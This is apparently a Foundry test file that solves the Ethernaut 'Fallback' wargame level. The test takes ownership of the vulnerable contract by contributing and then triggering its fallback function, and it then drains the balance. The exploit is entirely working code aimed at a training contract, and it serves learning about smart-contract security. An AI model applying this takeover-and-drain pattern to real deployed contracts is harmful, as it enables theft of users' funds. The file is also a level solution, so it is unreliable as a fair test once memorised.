// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test} from "forge-std/Test.sol";
import {Fallback} from "ethernaut/levels/Fallback.sol";

contract FallbackTest is Test {
    Fallback target;
    address player;

    function setUp() public {
        player = makeAddr("player");
        vm.deal(player, 1 ether);

        target = new Fallback();
    }

    function attack() private {
        // contribute
        target.contribute{value: 1}();

        // fallback
        (bool ok,) = address(target).call{value: 1}("");
        require(ok, "call failed");

        // confirm ownership for the next step
        require(target.owner() == address(player), "must be owner");

        // withdraw
        target.withdraw();
    }

    function testAttack() public {
        vm.startPrank(player);
        attack();
        vm.stopPrank();

        assertEq(target.owner(), address(player), "owner should be the player");
        assertEq(address(target).balance, 0, "balance should be drained");
    }
}
